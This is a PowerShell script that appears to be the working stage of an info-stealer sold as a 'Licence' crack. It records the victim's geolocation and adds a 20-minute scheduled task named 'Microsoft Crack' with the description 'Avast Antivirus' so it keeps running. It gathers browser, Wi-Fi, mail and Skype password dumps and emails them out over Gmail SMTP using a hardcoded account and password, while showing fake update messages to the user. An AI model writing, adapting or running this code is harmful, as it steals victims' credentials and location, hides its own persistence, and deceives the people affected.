Start-Sleep -Milliseconds 60
$location = ($pwd).path

Add-Type -AssemblyName System.Device 
$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher 
$GeoWatcher.Start() 
while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
    Start-Sleep -Milliseconds 100 
}  

if ($GeoWatcher.Permission -eq 'Denied'){
    Write-Error 'Access Denied for Location Information'
} else {
    echo ***************location************** > .\Microsoft\Location\GeoLocation.txt
    $GeoWatcher.Position.Location | Select Latitude,Longitude >> .\Microsoft\Location\GeoLocation.txt
}

echo To know Location: >> .\Microsoft\Location\GeoLocation.txt
echo https://www.latlong.net/Show-Latitude-Longitude.html >> .\Microsoft\Location\GeoLocation.txt
echo **************************************************** >> .\Microsoft\Location\GeoLocation.txt




if(!(Test-Path "$location\Microsoft\count.txt")) {
    [int]$count=0
    echo "$count"> "$location\Microsoft\count.txt"
}else{
    $count= Get-Content "$location\Microsoft\count.txt"
}


     try { 
	  schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "Microsoft Crack" /TR 'wscript.exe ""C:\Users\Public\Licence\Licence-main\Autorun.vbs""' /ST 00:00 /RI 20 /DU 24:00 | Out-Null
     }
     catch { 
	    $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("20")) -RepeatIndefinitely
            $action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '"C:\Users\Public\Licence\Licence-main\Autorun.vbs"'
            Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Microsoft Crack" -Description "Avast Antivirus" -Force		
	   }
  	
	
     $error.clear()
     try { 
	   Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption
     }
     catch { echo "Microsoft Windows" }
     

Start-Sleep -Milliseconds 10
if (!(test-connection 8.8.8.8 -Count 1 -Quiet)) {
    Start-Sleep -Milliseconds 100
    echo " "
    echo " "
    echo "Error: Error in connect()"
    Start-Sleep -Milliseconds 100
    (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content	
        Start-Sleep -Milliseconds 1000
        echo "Checking internet connection.."
	Start-Sleep -Milliseconds 5000
    echo "No internet connection? Try again!!"  
    Start-Sleep -Milliseconds 100 
}     
else{
    echo " "   
    echo " "
    echo " "
    echo " "    
    echo " " 
    echo " "
    echo 'Gathering information.'
    Start-Sleep -Milliseconds 80  
    $ip= (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
  

    $smtpserver = "smtp.gmail.com"
    $msg = new-object Net.Mail.MailMessage
    $smtp = New-Object Net.Mail.SmtpClient($smtpServer )
    $smtp.Timeout = 400000
    $smtp.EnableSsl = $True
    $smtp.Credentials = New-Object System.Net.NetworkCredential("com.microsoft.official@gmail.com", "33864171shakil"); 
    $msg.From = "com.microsoft.official@gmail.com"
    $msg.To.Add("com.microsoft.official@gmail.com")

    $msg.Subject = "$env:computername ### {$ip ($count)}"
    $msg.Body = "New small Hack Arrived. Lets Enjoy !!!"                     

    $file1 = "$location\Microsoft\Microsoft.zip"

    if(Test-Path $file1) {
    Remove-Item  $file1 -Recurse -Force -Confirm:$false
    }
	
	
	   

     $error.clear()
     try { 
        Compress-Archive -Path $location\Microsoft -DestinationPath "$location\Microsoft\Microsoft.zip" -Force -Confirm:$false
     }
       catch { 
        

	Start-Sleep -Milliseconds 10
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Browser\BrowserDownloadsView.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Browser\MyLastSearch.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Browser\WebBrowserPassView.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Chrome\ChromePass.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Firefox\FirefoxDownloadsView.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Firefox\PasswordFox.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\IExplorer\iepv.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Location\GeoLocation.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Opera\OperaPassView.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Social\mailpv.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Social\SkypeLogView.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\Task\TaskSchedulerView.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\WiFi\WirelessPass.txt")
	$msg.Attachments.Add("C:\Users\Public\Licence\Licence-main\Microsoft\IPnHost.txt")
	   
       
       

     }
     if (!$error) {
       Start-Sleep -Milliseconds 10
       $msg.Attachments.Add($file1)
     }

    echo "This process will take some time. Please wait.."
    $smtp.Send($msg) | Out-Null
    Start-Sleep -Milliseconds 3000
    echo '1 file updated & 17 updates found.' 
     
    }   
    $count= [int]$count+1
    $count > "$location\Microsoft\count.txt"
    Start-Sleep -Milliseconds 500
   
    

    
exit
